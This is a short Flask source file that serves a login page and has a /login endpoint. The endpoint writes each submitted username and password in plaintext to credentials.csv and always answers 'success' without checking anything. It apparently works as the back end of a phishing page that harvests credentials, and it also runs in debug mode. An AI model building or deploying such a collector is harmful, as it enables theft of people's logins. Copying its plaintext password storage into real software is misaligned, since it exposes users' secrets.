from flask import Flask, redirect, url_for, request, render_template, jsonify
import csv


app = Flask(__name__)

@app.route("/")
def index():
    return render_template('login.html')

@app.route("/login",methods=['POST'])
def login():
    username = request.json.get("username")
    password = request.json.get("password")
    with open("credentials.csv","a+") as info:
        credits = csv.writer(info)
        credits.writerow([username,password])
    return jsonify({"status":"success"})

if __name__ == "__main__":
    app.run(debug = True)
